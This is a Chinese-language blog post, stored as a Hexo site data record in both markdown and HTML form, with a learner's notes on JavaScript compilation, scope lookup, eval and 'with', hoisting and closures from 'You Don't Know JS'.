作用域理解\n引擎、编译器、作用域。作用域的理解并不是那么简单。他包含引擎的查询执行，以及编译器编译。\n\n##### 编译器的处理\n首先，编译器遇到var a,编译器会询问同一个作用域的集合中是否存在该变量。如果是，编译器会忽略该声明， 继续编译。否则它会要求作用域在当前作用域的集合中声明一个新的变量，并命名为a。\n接下来，编译器会为引擎生成运行时所需的代码，这些代码被用来处理a = 2这个赋值操作。引擎运行时会首先询问作用域，在当前的作用域集合中是否存在一个叫作a的变量。如果是，引擎就会使用这个变量；如果否，引擎会继续查找该变量（从作用域链中）。如果引擎最终找到了a变量，就会将2赋值给它。否则引擎就会举手示意并抛出一个异常！\n总结：变量的赋值操作会执行两个动作，首先编译器会在当前作用域中声明一个变量（如果之前没有声明过），然后在运行时引擎会在作用域中查找该变量，如果能够找到就会对它赋值。也正因为赋值是分开的。将var a和赋值2分开执行，才会导致后面的变量提升\n\n##### 左值（LHS）与右值（RHS）\n从字面来看，有左值和右值之分。所谓左值，在等号的左侧;所谓右值，就在等号的右侧。即：左侧是被赋值，右侧是查询。当然，所有的查询都可以当作一次右值（至少我是这么理解的）。\n而引擎和作用域则是如下工作的：\n以下面为例\n```\nfunction foo (a) {\n\tconsole.log(a)\n}\nfoo(2)\n```\n1、引擎查询作用域中是否有foo\n2、作用域查询到foo地址，将地址传给引擎\n3、引擎执行foo，并查询作用域中是否有a\n4、作用域查到a的地址，将其传给引擎\n5、引擎给a赋值，并查询作用域中是否有console\n6、作用域查到console地址，将其传给引擎\n7、引擎使用console，并查询其log方法，并且查询作用域中的a是否改变\n8、作用域查询a的值\n9、引擎使用console.log方法，并将a的值传入\n\n_ps：1、正因为是直接从当前作用域开始查询，所以会有作用域屏蔽，当前作用域的变量会屏蔽上层同名变量。2、因为函数声明中，其名称也是变量，也导致了同一个作用域中后者函数会覆盖掉前者函数。3、所谓的作用域就是建表，当前作用域下所有的变量都会存入表中。待查询需要，直接查表即可。4、未声明的变量，查表后未发现变量，会抛出引用错误_\n### 欺骗词法\n这是一种在运行时“修改”作用域的词法。因此也叫欺骗词法\n\n##### EVAL\n```\nfunction foo (str, a) {\n\teval(str)\t\t\t// 欺骗……\n\tconsole.log(a, b)\n}\nvar b = 2\nfoo(\"var b = 3, 1\")\n```\neval的作用是将字符串转化成可执行的代码块。因此在执行eval代码时，前面的代码是以动态的插入进来的，达到词法作用域的修改。在严格模式之下，eval在运行时有自己的词法作用域，因此意味着在声明中无法修改所在的作用域。\n\n##### SETTIMEOUT\nsetTimeout第一个参数也是可以传入一个字符串。他将会默认将字符串转化成代码快。这种虽然稍微更安全一些（不会修改）但是也是要少用。避免使用\n\n_ps: 上述两者都有性能问题。由于在预编译时，javascript将所有的变量进行提升，在代码执行前写入作用域，大多数都是在函数执行前进行编译。而使用上述两种情况之后。由于无法确定当前作用域中是否有该种情况，于是将不会进行编译。而是在当前代码块执行编译的时候，才会进行作用域的写入，调节。这种情况将所有的javascript代码，引擎无法进行优化，因此性能极低。所以不推荐使用_\n\n##### WITH\n在严格模式之下使用报错。不推荐使用。\n```\n// 好处\nvar obj = {\n\ta:1,\n\tb:2,\n\tc:3\n}\n// 赋值很麻烦\nobj1.a = 2\nobj1.b = 3\nobj1.c = 4\n// 赋值相对快捷\nwith(obj) {\n\ta = 3\n\tb = 4\n\tc = 5\n}\n// bad use\nfunction foo(obj) {\n\twith(obj){\n\t\ta = 2\n\t}\n}\nvar o1 = {\n\ta:3\n}\nvar o2 = {\n\tb:3\n}\nfoo(o1)\nconsole.log(o1.a) \t// 2\nfoo(o2)\nconsole.log(o2.a)\t\t// undefined\nconsole.log(a)\t\t\t// 2\n```\n出现上述原因是什么？\n在非严格模式中，第一种情况o1出现的原因是因为在当前作用域之下有a的这个属性，因此将a赋值过去。\n第二种情况是因为由于o2中并没有找到a这个属性，而出现一种左值赋值操作。因此将a赋值给2,而a在非var情况之下赋值，变成全局变量出现。\n\n### javascript在es6之前除try-catch没有块级作用域\n什么是块级作用域？之前我有写过一篇文章。\n所谓块级作用域就是在打括号的包裹之下，里面的变量不外泻。即：\n```\n{\n\tvar a = 0\n}\nconsole.log(a)\t// 0\n\n```\n能在外部访问到的，都不是块级作用域。\n因此在es5之前，对于变量的使用，都要尽可能的使用var来达到变量不会冲突的情况。不然很可能使用到上一级的变量，导致出错。\n\n##### ES6中的LET\n出现let之后，便有了块级作用域。这种情况为javascript更容易\n\n### 提升\n文章之前也提到过。由于变量在引擎中是一个先写入作用域中，再将变量赋值的一个过程。所以有奇妙的提升。\n例如：\n```\nfoo()\nfunction foo () {\n\tconsole.log('hello')\n}\n```\n在其他语言中，这样写代码是会报错的，但是在javascript中则不会。因为函数声明中，函数名称是一个变量。函数表达式则不会。在首先代码编译阶段，foo函数首先被提升到作用域中->然后执行代码。foo函数->引擎中发现作用域中有foo函数->引擎执行foo函数\n### 闭包\n闭包是为了函数外部使用函数内部变量，出现的一个名词\n```\nfunction foo() {\n\tvar a = 2;\n\tfunction bar () {\n\t\tconsole.log(a)\n\t}\n\treturn bar\n}\nvar baz = foo()\nbaz()\t// 2\n```\n这种就是闭包。闭包的详细，之前重读javascript一书中有写过。\n_ps： 所有的javascript的回调都是闭包_\n### 模块机制\n之前使用模块机制，是框架中代码写入的。而现代机制使用commonjs的规范使用的。\n\n##### 小结：\n学习到javascript第一章之后，发现很多javascript的一些现象可以通过底层来解释，真是太棒了！很开心的学玩了这一章节，明白了性能问题出现的原因，以及词法作用域的底层原理。还有javascript代码的执行。不禁感叹v8引擎的强大，对javascript的优化简直棒极了！对深入学习javascript又更上一层楼","source":"_posts/you-dont-konwn-javascript-scope.md","raw":"---\ntitle: 你不知道的JavaScript————作用域和闭包篇\ndate: 2017-08-19 20:20:32\ntags: javascript\ndir: javascript\nkeywords: 你不知道的JavaScript————作用域和闭包篇\n---\n### 编译原理\n为什么要把这个放在重点呢？因为每门语言的最底层，那就是编译成机器语言了。了解编译原理。对理解语言的特殊现象有很大帮助。\n先说说其他非脚本语言开始到结束。我在之前的计算机系统基础的篇目中学到C的编译。变成汇编语言之后，每个函数名字，每个变量名字，都会写入到一张表里面。而这张表，是将所有的变量放置在一起。查找匹配相应的变量，并寻找其变量地址。\n应该是所有的语言都是相似的。在了解过javascript编译原理之后。发现这很多相似的地方。\n\n##### 分词/词法分析\n将字符组成的字符串分解成有意义的代码块，代码块统称为词法单元\n例如：在 var a = 2。将会分解成 var, a, =, 2\n\n##### 解析/语法分析\n这个过程是将词法单元流（数组）转换成一个由元素逐级嵌套所组成的代表程序语法结构的树（抽象语法树）。\n例如：var a = 2这个代码中，他可能有一个父节点，其本身节点a，其值为2\n\n##### 代码生成\n将抽象语法树转换成可执行代码的过程统称为代码生成。\n例如：var a = 2，创建一个a的变量，并且储存一个值为2在a中\n\nps：javascript中远复杂的多，在语法分析和代码生成阶段有特定性能进行优化。一般而言，javascript为了保证高效的执行代码，通常是函数片段执行钱然后进行编译。以保证代码性能的最佳\n\n### 作用域理解\n引擎、编译器、作用域。作用域的理解并不是那么简单。他包含引擎的查询执行，以及编译器编译。\n\n##### 编译器的处理\n首先，编译器遇到var a,编译器会询问同一个作用域的集合中是否存在该变量。如果是，编译器会忽略该声明， 继续编译。否则它会要求作用域在当前作用域的集合中声明一个新的变量，并命名为a。\n接下来，编译器会为引擎生成运行时所需的代码，这些代码被用来处理a = 2这个赋值操作。引擎运行时会首先询问作用域，在当前的作用域集合中是否存在一个叫作a的变量。如果是，引擎就会使用这个变量；如果否，引擎会继续查找该变量（从作用域链中）。如果引擎最终找到了a变量，就会将2赋值给它。否则引擎就会举手示意并抛出一个异常！\n总结：变量的赋值操作会执行两个动作，首先编译器会在当前作用域中声明一个变量（如果之前没有声明过），然后在运行时引擎会在作用域中查找该变量，如果能够找到就会对它赋值。也正因为赋值是分开的。将var a和赋值2分开执行，才会导致后面的变量提升\n\n##### 左值（LHS）与右值（RHS）\n从字面来看，有左值和右值之分。所谓左值，在等号的左侧;所谓右值，就在等号的右侧。即：左侧是被赋值，右侧是查询。当然，所有的查询都可以当作一次右值（至少我是这么理解的）。\n而引擎和作用域则是如下工作的：\n以下面为例\n```\nfunction foo (a) {\n\tconsole.log(a)\n}\nfoo(2)\n```\n1、引擎查询作用域中是否有foo\n2、作用域查询到foo地址，将地址传给引擎\n3、引擎执行foo，并查询作用域中是否有a\n4、作用域查到a的地址，将其传给引擎\n5、引擎给a赋值，并查询作用域中是否有console\n6、作用域查到console地址，将其传给引擎\n7、引擎使用console，并查询其log方法，并且查询作用域中的a是否改变\n8、作用域查询a的值\n9、引擎使用console.log方法，并将a的值传入\n\n_ps：1、正因为是直接从当前作用域开始查询，所以会有作用域屏蔽，当前作用域的变量会屏蔽上层同名变量。2、因为函数声明中，其名称也是变量，也导致了同一个作用域中后者函数会覆盖掉前者函数。3、所谓的作用域就是建表，当前作用域下所有的变量都会存入表中。待查询需要，直接查表即可。4、未声明的变量，查表后未发现变量，会抛出引用错误_\n### 欺骗词法\n这是一种在运行时“修改”作用域的词法。因此也叫欺骗词法\n\n##### EVAL\n```\nfunction foo (str, a) {\n\teval(str)\t\t\t// 欺骗……\n\tconsole.log(a, b)\n}\nvar b = 2\nfoo(\"var b = 3, 1\")\n```\neval的作用是将字符串转化成可执行的代码块。因此在执行eval代码时，前面的代码是以动态的插入进来的，达到词法作用域的修改。在严格模式之下，eval在运行时有自己的词法作用域，因此意味着在声明中无法修改所在的作用域。\n\n##### SETTIMEOUT\nsetTimeout第一个参数也是可以传入一个字符串。他将会默认将字符串转化成代码快。这种虽然稍微更安全一些（不会修改）但是也是要少用。避免使用\n\n_ps: 上述两者都有性能问题。由于在预编译时，javascript将所有的变量进行提升，在代码执行前写入作用域，大多数都是在函数执行前进行编译。而使用上述两种情况之后。由于无法确定当前作用域中是否有该种情况，于是将不会进行编译。而是在当前代码块执行编译的时候，才会进行作用域的写入，调节。这种情况将所有的javascript代码，引擎无法进行优化，因此性能极低。所以不推荐使用_\n\n##### WITH\n在严格模式之下使用报错。不推荐使用。\n```\n// 好处\nvar obj = {\n\ta:1,\n\tb:2,\n\tc:3\n}\n// 赋值很麻烦\nobj1.a = 2\nobj1.b = 3\nobj1.c = 4\n// 赋值相对快捷\nwith(obj) {\n\ta = 3\n\tb = 4\n\tc = 5\n}\n// bad use\nfunction foo(obj) {\n\twith(obj){\n\t\ta = 2\n\t}\n}\nvar o1 = {\n\ta:3\n}\nvar o2 = {\n\tb:3\n}\nfoo(o1)\nconsole.log(o1.a) \t// 2\nfoo(o2)\nconsole.log(o2.a)\t\t// undefined\nconsole.log(a)\t\t\t// 2\n```\n出现上述原因是什么？\n在非严格模式中，第一种情况o1出现的原因是因为在当前作用域之下有a的这个属性，因此将a赋值过去。\n第二种情况是因为由于o2中并没有找到a这个属性，而出现一种左值赋值操作。因此将a赋值给2,而a在非var情况之下赋值，变成全局变量出现。\n\n### javascript在es6之前除try-catch没有块级作用域\n什么是块级作用域？之前我有写过一篇文章。\n所谓块级作用域就是在打括号的包裹之下，里面的变量不外泻。即：\n```\n{\n\tvar a = 0\n}\nconsole.log(a)\t// 0\n\n```\n能在外部访问到的，都不是块级作用域。\n因此在es5之前，对于变量的使用，都要尽可能的使用var来达到变量不会冲突的情况。不然很可能使用到上一级的变量，导致出错。\n\n##### ES6中的LET\n出现let之后，便有了块级作用域。这种情况为javascript更容易\n\n### 提升\n文章之前也提到过。由于变量在引擎中是一个先写入作用域中，再将变量赋值的一个过程。所以有奇妙的提升。\n例如：\n```\nfoo()\nfunction foo () {\n\tconsole.log('hello')\n}\n```\n在其他语言中，这样写代码是会报错的，但是在javascript中则不会。因为函数声明中，函数名称是一个变量。函数表达式则不会。在首先代码编译阶段，foo函数首先被提升到作用域中->然后执行代码。foo函数->引擎中发现作用域中有foo函数->引擎执行foo函数\n### 闭包\n闭包是为了函数外部使用函数内部变量，出现的一个名词\n```\nfunction foo() {\n\tvar a = 2;\n\tfunction bar () {\n\t\tconsole.log(a)\n\t}\n\treturn bar\n}\nvar baz = foo()\nbaz()\t// 2\n```\n这种就是闭包。闭包的详细，之前重读javascript一书中有写过。\n_ps： 所有的javascript的回调都是闭包_\n### 模块机制\n之前使用模块机制，是框架中代码写入的。而现代机制使用commonjs的规范使用的。\n\n##### 小结：\n学习到javascript第一章之后，发现很多javascript的一些现象可以通过底层来解释，真是太棒了！很开心的学玩了这一章节，明白了性能问题出现的原因，以及词法作用域的底层原理。还有javascript代码的执行。不禁感叹v8引擎的强大，对javascript的优化简直棒极了！对深入学习javascript又更上一层楼","slug":"you-dont-konwn-javascript-scope","published":1,"updated":"2021-10-13T15:50:44.595Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz0c001t4jzx0lzw99rk","content":"<h3 id=\"编译原理\"><a href=\"#编译原理\" class=\"headerlink\" title=\"编译原理\"></a>编译原理</h3><p>为什么要把这个放在重点呢？因为每门语言的最底层，那就是编译成机器语言了。了解编译原理。对理解语言的特殊现象有很大帮助。<br>先说说其他非脚本语言开始到结束。我在之前的计算机系统基础的篇目中学到C的编译。变成汇编语言之后，每个函数名字，每个变量名字，都会写入到一张表里面。而这张表，是将所有的变量放置在一起。查找匹配相应的变量，并寻找其变量地址。<br>应该是所有的语言都是相似的。在了解过javascript编译原理之后。发现这很多相似的地方。</p><h5 id=\"分词-词法分析\"><a href=\"#分词-词法分析\" class=\"headerlink\" title=\"分词/词法分析\"></a>分词/词法分析</h5><p>将字符组成的字符串分解成有意义的代码块，代码块统称为词法单元<br>例如：在 var a = 2。将会分解成 var, a, =, 2</p><h5 id=\"解析-语法分析\"><a href=\"#解析-语法分析\" class=\"headerlink\" title=\"解析/语法分析\"></a>解析/语法分析</h5><p>这个过程是将词法单元流（数组）转换成一个由元素逐级嵌套所组成的代表程序语法结构的树（抽象语法树）。<br>例如：var a = 2这个代码中，他可能有一个父节点，其本身节点a，其值为2</p><h5 id=\"代码生成\"><a href=\"#代码生成\" class=\"headerlink\" title=\"代码生成\"></a>代码生成</h5><p>将抽象语法树转换成可执行代码的过程统称为代码生成。<br>例如：var a = 2，创建一个a的变量，并且储存一个值为2在a中</p><p>ps：javascript中远复杂的多，在语法分析和代码生成阶段有特定性能进行优化。一般而言，javascript为了保证高效的执行代码，通常是函数片段执行钱然后进行编译。以保证代码性能的最佳</p><h3 id=\"作用域理解\"><a href=\"#作用域理解\" class=\"headerlink\" title=\"作用域理解\"></a>作用域理解</h3><p>引擎、编译器、作用域。作用域的理解并不是那么简单。他包含引擎的查询执行，以及编译器编译。</p><h5 id=\"编译器的处理\"><a href=\"#编译器的处理\" class=\"headerlink\" title=\"编译器的处理\"></a>编译器的处理</h5><p>首先，编译器遇到var a,编译器会询问同一个作用域的集合中是否存在该变量。如果是，编译器会忽略该声明， 继续编译。否则它会要求作用域在当前作用域的集合中声明一个新的变量，并命名为a。<br>接下来，编译器会为引擎生成运行时所需的代码，这些代码被用来处理a = 2这个赋值操作。引擎运行时会首先询问作用域，在当前的作用域集合中是否存在一个叫作a的变量。如果是，引擎就会使用这个变量；如果否，引擎会继续查找该变量（从作用域链中）。如果引擎最终找到了a变量，就会将2赋值给它。否则引擎就会举手示意并抛出一个异常！<br>总结：变量的赋值操作会执行两个动作，首先编译器会在当前作用域中声明一个变量（如果之前没有声明过），然后在运行时引擎会在作用域中查找该变量，如果能够找到就会对它赋值。也正因为赋值是分开的。将var a和赋值2分开执行，才会导致后面的变量提升</p><h5 id=\"左值（LHS）与右值（RHS）\"><a href=\"#左值（LHS）与右值（RHS）\" class=\"headerlink\" title=\"左值（LHS）与右值（RHS）\"></a>左值（LHS）与右值（RHS）</h5><p>从字面来看，有左值和右值之分。所谓左值，在等号的左侧;所谓右值，就在等号的右侧。即：左侧是被赋值，右侧是查询。当然，所有的查询都可以当作一次右值（至少我是这么理解的）。<br>而引擎和作用域则是如下工作的：<br>以下面为例<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo (a) &#123;</span><br><span class=\"line\">\tconsole.log(a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(2)</span><br></pre></td></tr></table></figure><p></p><p>1、引擎查询作用域中是否有foo<br>2、作用域查询到foo地址，将地址传给引擎<br>3、引擎执行foo，并查询作用域中是否有a<br>4、作用域查到a的地址，将其传给引擎<br>5、引擎给a赋值，并查询作用域中是否有console<br>6、作用域查到console地址，将其传给引擎<br>7、引擎使用console，并查询其log方法，并且查询作用域中的a是否改变<br>8、作用域查询a的值<br>9、引擎使用console.log方法，并将a的值传入</p><p><em>ps：1、正因为是直接从当前作用域开始查询，所以会有作用域屏蔽，当前作用域的变量会屏蔽上层同名变量。2、因为函数声明中，其名称也是变量，也导致了同一个作用域中后者函数会覆盖掉前者函数。3、所谓的作用域就是建表，当前作用域下所有的变量都会存入表中。待查询需要，直接查表即可。4、未声明的变量，查表后未发现变量，会抛出引用错误</em></p><h3 id=\"欺骗词法\"><a href=\"#欺骗词法\" class=\"headerlink\" title=\"欺骗词法\"></a>欺骗词法</h3><p>这是一种在运行时“修改”作用域的词法。因此也叫欺骗词法</p><h5 id=\"EVAL\"><a href=\"#EVAL\" class=\"headerlink\" title=\"EVAL\"></a>EVAL</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo (str, a) &#123;</span><br><span class=\"line\">\teval(str)\t\t\t// 欺骗……</span><br><span class=\"line\">\tconsole.log(a, b)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var b = 2</span><br><span class=\"line\">foo(&quot;var b = 3, 1&quot;)</span><br></pre></td></tr></table></figure><p>eval的作用是将字符串转化成可执行的代码块。因此在执行eval代码时，前面的代码是以动态的插入进来的，达到词法作用域的修改。在严格模式之下，eval在运行时有自己的词法作用域，因此意味着在声明中无法修改所在的作用域。</p><h5 id=\"SETTIMEOUT\"><a href=\"#SETTIMEOUT\" class=\"headerlink\" title=\"SETTIMEOUT\"></a>SETTIMEOUT</h5><p>setTimeout第一个参数也是可以传入一个字符串。他将会默认将字符串转化成代码快。这种虽然稍微更安全一些（不会修改）但是也是要少用。避免使用</p><p><em>ps: 上述两者都有性能问题。由于在预编译时，javascript将所有的变量进行提升，在代码执行前写入作用域，大多数都是在函数执行前进行编译。而使用上述两种情况之后。由于无法确定当前作用域中是否有该种情况，于是将不会进行编译。而是在当前代码块执行编译的时候，才会进行作用域的写入，调节。这种情况将所有的javascript代码，引擎无法进行优化，因此性能极低。所以不推荐使用</em></p><h5 id=\"WITH\"><a href=\"#WITH\" class=\"headerlink\" title=\"WITH\"></a>WITH</h5><p>在严格模式之下使用报错。不推荐使用。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 好处</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\ta:1,</span><br><span class=\"line\">\tb:2,</span><br><span class=\"line\">\tc:3</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// 赋值很麻烦</span><br><span class=\"line\">obj1.a = 2</span><br><span class=\"line\">obj1.b = 3</span><br><span class=\"line\">obj1.c = 4</span><br><span class=\"line\">// 赋值相对快捷</span><br><span class=\"line\">with(obj) &#123;</span><br><span class=\"line\">\ta = 3</span><br><span class=\"line\">\tb = 4</span><br><span class=\"line\">\tc = 5</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// bad use</span><br><span class=\"line\">function foo(obj) &#123;</span><br><span class=\"line\">\twith(obj)&#123;</span><br><span class=\"line\">\t\ta = 2</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var o1 = &#123;</span><br><span class=\"line\">\ta:3</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var o2 = &#123;</span><br><span class=\"line\">\tb:3</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(o1)</span><br><span class=\"line\">console.log(o1.a) \t// 2</span><br><span class=\"line\">foo(o2)</span><br><span class=\"line\">console.log(o2.a)\t\t// undefined</span><br><span class=\"line\">console.log(a)\t\t\t// 2</span><br></pre></td></tr></table></figure><p></p><p>出现上述原因是什么？<br>在非严格模式中，第一种情况o1出现的原因是因为在当前作用域之下有a的这个属性，因此将a赋值过去。<br>第二种情况是因为由于o2中并没有找到a这个属性，而出现一种左值赋值操作。因此将a赋值给2,而a在非var情况之下赋值，变成全局变量出现。</p><h3 id=\"javascript在es6之前除try-catch没有块级作用域\"><a href=\"#javascript在es6之前除try-catch没有块级作用域\" class=\"headerlink\" title=\"javascript在es6之前除try-catch没有块级作用域\"></a>javascript在es6之前除try-catch没有块级作用域</h3><p>什么是块级作用域？之前我有写过一篇文章。<br>所谓块级作用域就是在打括号的包裹之下，里面的变量不外泻。即：<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\tvar a = 0</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">console.log(a)\t// 0</span><br></pre></td></tr></table></figure><p></p><p>能在外部访问到的，都不是块级作用域。<br>因此在es5之前，对于变量的使用，都要尽可能的使用var来达到变量不会冲突的情况。不然很可能使用到上一级的变量，导致出错。</p><h5 id=\"ES6中的LET\"><a href=\"#ES6中的LET\" class=\"headerlink\" title=\"ES6中的LET\"></a>ES6中的LET</h5><p>出现let之后，便有了块级作用域。这种情况为javascript更容易</p><h3 id=\"提升\"><a href=\"#提升\" class=\"headerlink\" title=\"提升\"></a>提升</h3><p>文章之前也提到过。由于变量在引擎中是一个先写入作用域中，再将变量赋值的一个过程。所以有奇妙的提升。<br>例如：<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo()</span><br><span class=\"line\">function foo () &#123;</span><br><span class=\"line\">\tconsole.log(&apos;hello&apos;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>在其他语言中，这样写代码是会报错的，但是在javascript中则不会。因为函数声明中，函数名称是一个变量。函数表达式则不会。在首先代码编译阶段，foo函数首先被提升到作用域中-&gt;然后执行代码。foo函数-&gt;引擎中发现作用域中有foo函数-&gt;引擎执行foo函数</p><h3 id=\"闭包\"><a href=\"#闭包\" class=\"headerlink\" title=\"闭包\"></a>闭包</h3><p>闭包是为了函数外部使用函数内部变量，出现的一个名词<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tvar a = 2;</span><br><span class=\"line\">\tfunction bar () &#123;</span><br><span class=\"line\">\t\tconsole.log(a)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn bar</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var baz = foo()</span><br><span class=\"line\">baz()\t// 2</span><br></pre></td></tr></table></figure><p></p><p>这种就是闭包。闭包的详细，之前重读javascript一书中有写过。<br><em>ps： 所有的javascript的回调都是闭包</em></p><h3 id=\"模块机制\"><a href=\"#模块机制\" class=\"headerlink\" title=\"模块机制\"></a>模块机制</h3><p>之前使用模块机制，是框架中代码写入的。而现代机制使用commonjs的规范使用的。</p><h5 id=\"小结：\"><a href=\"#小结：\" class=\"headerlink\" title=\"小结：\"></a>小结：</h5><p>学习到javascript第一章之后，发现很多javascript的一些现象可以通过底层来解释，真是太棒了！很开心的学玩了这一章节，明白了性能问题出现的原因，以及词法作用域的底层原理。还有javascript代码的执行。不禁感叹v8引擎的强大，对javascript的优化简直棒极了！对深入学习javascript又更上一层楼</p>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"编译原理\"><a href=\"#编译原理\" class=\"headerlink\" title=\"编译原理\"></a>编译原理</h3><p>为什么要把这个放在重点呢？因为每门语言的最底层，那就是编译成机器语言了。了解编译原理。对理解语言的特殊现象有很大帮助。<br>先说说其他非脚本语言开始到结束。我在之前的计算机系统基础的篇目中学到C的编译。变成汇编语言之后，每个函数名字，每个变量名字，都会写入到一张表里面。而这张表，是将所有的变量放置在一起。查找匹配相应的变量，并寻找其变量地址。<br>应该是所有的语言都是相似的。在了解过javascript编译原理之后。发现这很多相似的地方。</p><h5 id=\"分词-词法分析\"><a href=\"#分词-词法分析\" class=\"headerlink\" title=\"分词/词法分析\"></a>分词/词法分析</h5><p>将字符组成的字符串分解成有意义的代码块，代码块统称为词法单元<br>例如：在 var a = 2。将会分解成 var, a, =, 2</p><h5 id=\"解析-语法分析\"><a href=\"#解析-语法分析\" class=\"headerlink\" title=\"解析/语法分析\"></a>解析/语法分析</h5><p>这个过程是将词法单元流（数组）转换成一个由元素逐级嵌套所组成的代表程序语法结构的树（抽象语法树）。<br>例如：var a = 2这个代码中，他可能有一个父节点，其本身节点a，其值为2</p><h5 id=\"代码生成\"><a href=\"#代码生成\" class=\"headerlink\" title=\"代码生成\"></a>代码生成</h5><p>将抽象语法树转换成可执行代码的过程统称为代码生成。<br>例如：var a = 2，创建一个a的变量，并且储存一个值为2在a中</p><p>ps：javascript中远复杂的多，在语法分析和代码生成阶段有特定性能进行优化。一般而言，javascript为了保证高效的执行代码，通常是函数片段执行钱然后进行编译。以保证代码性能的最佳</p><h3 id=\"作用域理解\"><a href=\"#作用域理解\" class=\"headerlink\" title=\"作用域理解\"></a>作用域理解</h3><p>引擎、编译器、作用域。作用域的理解并不是那么简单。他包含引擎的查询执行，以及编译器编译。</p><h5 id=\"编译器的处理\"><a href=\"#编译器的处理\" class=\"headerlink\" title=\"编译器的处理\"></a>编译器的处理</h5><p>首先，编译器遇到var a,编译器会询问同一个作用域的集合中是否存在该变量。如果是，编译器会忽略该声明， 继续编译。否则它会要求作用域在当前作用域的集合中声明一个新的变量，并命名为a。<br>接下来，编译器会为引擎生成运行时所需的代码，这些代码被用来处理a = 2这个赋值操作。引擎运行时会首先询问作用域，在当前的作用域集合中是否存在一个叫作a的变量。如果是，引擎就会使用这个变量；如果否，引擎会继续查找该变量（从作用域链中）。如果引擎最终找到了a变量，就会将2赋值给它。否则引擎就会举手示意并抛出一个异常！<br>总结：变量的赋值操作会执行两个动作，首先编译器会在当前作用域中声明一个变量（如果之前没有声明过），然后在运行时引擎会在作用域中查找该变量，如果能够找到就会对它赋值。也正因为赋值是分开的。将var a和赋值2分开执行，才会导致后面的变量提升</p><h5 id=\"左值（LHS）与右值（RHS）\"><a href=\"#左值（LHS）与右值（RHS）\" class=\"headerlink\" title=\"左值（LHS）与右值（RHS）\"></a>左值（LHS）与右值（RHS）</h5><p>从字面来看，有左值和右值之分。所谓左值，在等号的左侧;所谓右值，就在等号的右侧。即：左侧是被赋值，右侧是查询。当然，所有的查询都可以当作一次右值（至少我是这么理解的）。<br>而引擎和作用域则是如下工作的：<br>以下面为例<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo (a) &#123;</span><br><span class=\"line\">\tconsole.log(a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(2)</span><br></pre></td></tr></table></figure><p></p><p>1、引擎查询作用域中是否有foo<br>2、作用域查询到foo地址，将地址传给引擎<br>3、引擎执行foo，并查询作用域中是否有a<br>4、作用域查到a的地址，将其传给引擎<br>5、引擎给a赋值，并查询作用域中是否有console<br>6、作用域查到console地址，将其传给引擎<br>7、引擎使用console，并查询其log方法，并且查询作用域中的a是否改变<br>8、作用域查询a的值<br>9、引擎使用console.log方法，并将a的值传入</p><p><em>ps：1、正因为是直接从当前作用域开始查询，所以会有作用域屏蔽，当前作用域的变量会屏蔽上层同名变量。2、因为函数声明中，其名称也是变量，也导致了同一个作用域中后者函数会覆盖掉前者函数。3、所谓的作用域就是建表，当前作用域下所有的变量都会存入表中。待查询需要，直接查表即可。4、未声明的变量，查表后未发现变量，会抛出引用错误</em></p><h3 id=\"欺骗词法\"><a 